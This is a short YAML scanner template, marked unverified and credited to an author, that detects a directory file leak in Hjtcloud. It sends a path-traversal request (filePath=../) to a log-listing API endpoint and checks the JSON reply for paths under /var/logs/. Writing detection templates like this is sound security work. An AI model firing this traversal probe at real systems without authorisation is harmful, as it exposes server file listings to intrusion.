expression: r0()
id: hjtcloud-directory-file-leak
info:
  author: YekkoY
  name: Hjtcloud Directory File Leak
  severity: high
  verified: false
rules:
  r0:
    expression: response.status == 200 && response.content_type.contains("application/json")
      && response.body.bcontains(b"\"absolutePath\":\"/var/logs/")
    request:
      method: GET
      path: /him/api/rest/V1.0/system/log/list?filePath=../
